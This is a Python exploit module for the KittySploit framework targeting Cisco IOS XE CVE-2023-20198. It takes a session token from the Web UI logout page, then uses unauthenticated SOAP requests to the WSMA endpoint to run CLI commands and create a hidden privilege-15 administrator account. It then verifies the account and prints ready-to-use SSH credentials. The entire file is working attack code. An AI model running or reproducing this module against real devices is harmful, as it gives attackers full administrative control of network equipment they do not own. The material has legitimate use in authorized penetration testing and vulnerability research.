#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import random
import re
import string
from typing import List, Optional, Tuple

from kittysploit import *
from lib.protocols.http.http_client import Http_client

_WSMA_EXEC_PATH = "/%2577eb%2575i_%2577sma_Http"
_WSMA_CONFIG_PATH = "/%2577ebui_wsma_http"
_LOGOUT_TOKEN_PATH = "/webui/logoutconfirm.html?logon_hash=1"
_TOKEN_RE = re.compile(r"[a-f0-9]{18}", re.I)
_USERNAME_LINE_RE = re.compile(
    r"username\s+(\S+)\s+privilege\s+15\s+secret",
    re.I,
)


class Module(Auxiliary, Http_client):
    __info__ = {
        "name": "Cisco IOS XE CVE-2023-20198 WSMA privilege escalation",
        "description": (
            "CVE-2023-20198: unauthenticated access to the Cisco IOS XE Web UI WSMA "
            "endpoint allows arbitrary CLI execution and creation of a privilege-15 "
            "local account. Retrieves a session token from the logout confirmation "
            "page, then submits SOAP execCLI or configApply requests to add an "
            "administrative user."
        ),
        "author": [
            "w3bd3vil",
            "KittySploit Team",
        ],
        "cve": ["CVE-2023-20198"],
        "references": [
            "https://www.horizon3.ai/cisco-ios-xe-cve-2023-20198-deep-dive-and-poc/",
            "https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-iosxe-webui-privesc-j22SaA4z",
            "https://nvd.nist.gov/vuln/detail/CVE-2023-20198",
        ],
        "tags": [
            "cisco",
            "ios-xe",
            "router",
            "network",
            "wsma",
            "soap",
            "privesc",
            "unauthenticated",
            "cve-2023-20198",
            "auxiliary",
        ],
        "agent": {
            "risk": "intrusive",
            "effects": ["active_exploitation", "credential_access"],
            "expected_requests": 4,
            "reversible": False,
            "approval_required": True,
            "produces": ["exploit_paths", "risk_signals", "credentials"],
            "cost": 1.5,
            "noise": 0.5,
            "value": 1.0,
            "requires": {
                "min_endpoints": 0,
                "min_params": 0,
                "tech_hints_any": ["cisco", "ios-xe", "ios xe", "catalyst"],
                "tech_hints_all": [],
                "specializations_any": [],
                "risk_signals_any": [],
                "auth_session": False,
                "capabilities_any": [],
                "capabilities_all": [],
                "confidence_min": {},
                "confidence_min_any": {},
                "endpoint_pattern_any": ["/webui/", "/%2577eb"],
                "param_any": [],
                "api_surface_ready": False,
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "admin_access", "from_detail": "ios_xe_user"},
                    {"capability": "network_device", "from_detail": ""},
                ],
                "consumes_capabilities": [],
                "option_bindings": {},
                "suggested_followups": [],
            },
        },
    }

    port = OptPort(80, "Target HTTP port", required=True)
    ssl = OptBool(False, "Use HTTPS", required=True, advanced=True)
    method = OptChoice(
        "execcli",
        "WSMA exploitation method",
        required=False,
        choices=["execcli", "config_apply"],
    )
    username = OptString(
        "",
        "Privilege-15 username to create (random if empty)",
        required=False,
    )
    password = OptString(
        "",
        "Password for the new account (random if empty)",
        required=False,
    )
    wsma_path = OptString(
        "",
        "Override WSMA endpoint path (auto-selected from method when empty)",
        required=False,
        advanced=True,
    )
    verify = OptBool(True, "Verify the created account via execCLI", required=False)
    verbose = OptBool(False, "Print full WSMA responses", required=False, advanced=True)

    def _opt(self, option) -> str:
        if hasattr(option, "value"):
            return str(option.value or "").strip()
        return str(option or "").strip()

    def _request_timeout(self) -> int:
        return max(int(self.timeout or 15), 15)

    def _random_alnum(self, length: int = 8) -> str:
        alphabet = string.ascii_lowercase + string.digits
        return "".join(random.choice(alphabet) for _ in range(length))

    def _probe_username(self) -> str:
        chosen = self._opt(self.username)
        if chosen:
            return chosen
        return "kitty" + self._random_alnum(6)

    def _probe_password(self) -> str:
        chosen = self._opt(self.password)
        if chosen:
            return chosen
        return self._random_alnum(12)

    def _wsma_endpoint(self) -> str:
        override = self._opt(self.wsma_path)
        if override:
            return override if override.startswith("/") else "/" + override
        if self._opt(self.method) == "config_apply":
            return _WSMA_CONFIG_PATH
        return _WSMA_EXEC_PATH

    def _retrieve_token(self) -> Optional[str]:
        response = self.http_request(
            method="POST",
            path=_LOGOUT_TOKEN_PATH,
            allow_redirects=False,
            timeout=self._request_timeout(),
        )
        if not response:
            return None
        match = _TOKEN_RE.search(response.text or "")
        return match.group(0) if match else None

    def _build_execcli_soap(
        self,
        commands: List[str],
        auth_user: str = "admin",
        auth_pass: str = "irrelevant",
        correlator: str = "1",
    ) -> str:
        cmd_xml = "".join(f"<cmd>{cmd}</cmd>" for cmd in commands)
        return (
            '<?xml version="1.0"?>\n'
            '<SOAP:Envelope xmlns:SOAP="http://schemas.xmlsoap.org/soap/envelope/">\n'
            "  <SOAP:Header>\n"
            '    <wsse:Security xmlns:wsse="http://schemas.xmlsoap.org/ws/2002/04/secext">\n'
            "      <wsse:UsernameToken>\n"
            f"        <wsse:Username>{auth_user}</wsse:Username>\n"
            f"        <wsse:Password>{auth_pass}</wsse:Password>\n"
            "      </wsse:UsernameToken>\n"
            "    </wsse:Security>\n"
            "  </SOAP:Header>\n"
            "  <SOAP:Body>\n"
            f'    <request correlator="{correlator}" xmlns="urn:cisco:wsma-exec">\n'
            '      <execCLI xsd="false">\n'
            f"{cmd_xml}\n"
            "      </execCLI>\n"
            "    </request>\n"
            "  </SOAP:Body>\n"
            "</SOAP:Envelope>"
        )

    def _build_config_apply_soap(self, username: str, password: str) -> str:
        return (
            '<?xml version="1.0" encoding="UTF-8"?>\n'
            '<SOAP:Envelope\n'
            '  xmlns:SOAP="http://schemas.xmlsoap.org/soap/envelope/"\n'
            '  xmlns:SOAP-ENC="http://schemas.xmlsoap.org/soap/encoding/"\n'
            '  xmlns:xsd="http://www.w3.org/2001/XMLSchema"\n'
            '  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">\n'
            "  <SOAP:Header>\n"
            '    <wsse:Security xmlns:wsse="http://schemas.xmlsoap.org/ws/2002/04/secext">\n'
            "      <wsse:UsernameToken>\n"
            "        <wsse:Username>admin</wsse:Username>\n"
            "        <wsse:Password>irrelevant</wsse:Password>\n"
            "      </wsse:UsernameToken>\n"
            "    </wsse:Security>\n"
            "  </SOAP:Header>\n"
            "  <SOAP:Body>\n"
            '    <request xmlns="urn:cisco:wsma-config" correlator="execl">\n'
            '      <configApply details="all">\n'
            "        <config-data>\n"
            "          <cli-config-data-block>\n"
            f"            username {username} privilege 15 secret {password}\n"
            "          </cli-config-data-block>\n"
            "        </config-data>\n"
            "      </configApply>\n"
            "    </request>\n"
            "  </SOAP:Body>\n"
            "</SOAP:Envelope>"
        )

    def _wsma_post(self, body: str, token: Optional[str] = None):
        headers = {"Content-Type": "text/xml;charset=UTF-8"}
        if token:
            headers["Authorization"] = token
        return self.http_request(
            method="POST",
            path=self._wsma_endpoint(),
            data=body,
            headers=headers,
            allow_redirects=False,
            timeout=self._request_timeout(),
        )

    def _exec_cli(
        self,
        commands: List[str],
        token: Optional[str],
        auth_user: str = "admin",
        auth_pass: str = "irrelevant",
        correlator: str = "1",
    ) -> Tuple[Optional[object], str]:
        soap = self._build_execcli_soap(
            commands,
            auth_user=auth_user,
            auth_pass=auth_pass,
            correlator=correlator,
        )
        response = self._wsma_post(soap, token=token)
        if not response:
            return None, ""
        return response, response.text or ""

    def _response_indicates_cli_success(self, body: str) -> bool:
        text = body or ""
        if not text.strip():
            return False
        lowered = text.lower()
        if "error" in lowered and "execcli" in lowered:
            return False
        markers = (
            "cisco ios",
            "version ",
            "hostname ",
            "username ",
            "wsma-response",
            "ok",
        )
        return any(marker in lowered for marker in markers)

    def _create_user_execcli(
        self,
        token: Optional[str],
        username: str,
        password: str,
    ) -> Tuple[bool, str]:
        commands = [
            "conf t",
            f"username {username} privilege 15 secret {password}",
            "exit",
        ]
        response, body = self._exec_cli(commands, token, correlator="create")
        if not response:
            return False, "WSMA execCLI request failed"
        if response.status_code >= 400 and not self._response_indicates_cli_success(body):
            return False, f"WSMA returned HTTP {response.status_code}"
        return True, body

    def _create_user_config_apply(
        self,
        token: Optional[str],
        username: str,
        password: str,
    ) -> Tuple[bool, str]:
        soap = self._build_config_apply_soap(username, password)
        response = self._wsma_post(soap, token=token)
        if not response:
            return False, "WSMA configApply request failed"
        body = response.text or ""
        if response.status_code >= 400 and "configapply" not in body.lower():
            return False, f"WSMA returned HTTP {response.status_code}"
        return True, body

    def _verify_user(
        self,
        token: Optional[str],
        username: str,
        password: str,
    ) -> Tuple[bool, str]:
        response, body = self._exec_cli(
            ["show running-config | include username"],
            token,
            auth_user=username,
            auth_pass=password,
            correlator="verify",
        )
        if not response:
            return False, ""
        match = _USERNAME_LINE_RE.search(body or "")
        if match and match.group(1).lower() == username.lower():
            return True, body
        if username.lower() in (body or "").lower() and "privilege 15" in (body or "").lower():
            return True, body
        return False, body

    def _exploit_chain(
        self,
        username: str,
        password: str,
        do_verify: bool,
        announce: bool = False,
    ) -> Tuple[bool, str, Optional[str]]:
        if announce:
            print_status("Retrieving WSMA session token from logout confirmation page")
        token = self._retrieve_token()
        if not token:
            return False, "Could not retrieve session token from /webui/logoutconfirm.html", None
        if announce:
            print_success(f"Retrieved token: {token}")

        method = self._opt(self.method) or "execcli"
        endpoint = self._wsma_endpoint()
        if announce:
            print_status(f"Creating privilege-15 user via {method} at {endpoint}")

        if method == "config_apply":
            ok, body = self._create_user_config_apply(token, username, password)
        else:
            ok, body = self._create_user_execcli(token, username, password)

        if bool(self.verbose) and body:
            print_info(body[:4000])

        if not ok:
            return False, body or "User creation failed", token

        if do_verify:
            if announce:
                print_status("Verifying account with authenticated execCLI")
            verified, verify_body = self._verify_user(token, username, password)
            if bool(self.verbose) and verify_body:
                print_info(verify_body[:4000])
            if not verified:
                return (
                    False,
                    "User creation request succeeded but verification did not confirm the account",
                    token,
                )

        return True, "Privilege-15 account created", token

    def check(self):
        token = self._retrieve_token()
        if not token:
            return {
                "vulnerable": False,
                "reason": "Could not retrieve WSMA token from Web UI logout page",
                "confidence": "low",
            }

        response, body = self._exec_cli(["show version"], token, correlator="check")
        if response and self._response_indicates_cli_success(body):
            return {
                "vulnerable": True,
                "reason": "Unauthenticated WSMA execCLI returned device output",
                "confidence": "high",
                "token": token,
            }

        status = response.status_code if response else "no response"
        return {
            "vulnerable": False,
            "reason": f"WSMA token retrieved but execCLI probe inconclusive (HTTP {status})",
            "confidence": "medium",
            "token": token,
        }

    def run(self):
        host = self._opt(self.target)
        if not host:
            print_error("Target host is required")
            return False

        username = self._probe_username()
        password = self._probe_password()

        print_status(f"Target: {host}:{int(self.port)} ({'HTTPS' if bool(self.ssl) else 'HTTP'})")
        print_status(f"New account: {username} / {password}")

        ok, reason, token = self._exploit_chain(
            username,
            password,
            do_verify=bool(self.verify),
            announce=True,
        )
        if not ok:
            print_error(reason)
            return False

        print_success(reason)
        print_success(f"Privilege-15 user created: {username}")
        print_info(f"Password: {password}")
        if token:
            print_info(f"WSMA token: {token}")
        print_info(
            f"SSH access: ssh {username}@{host}  (privilege level 15 / equivalent to enable)"
        )
        return True
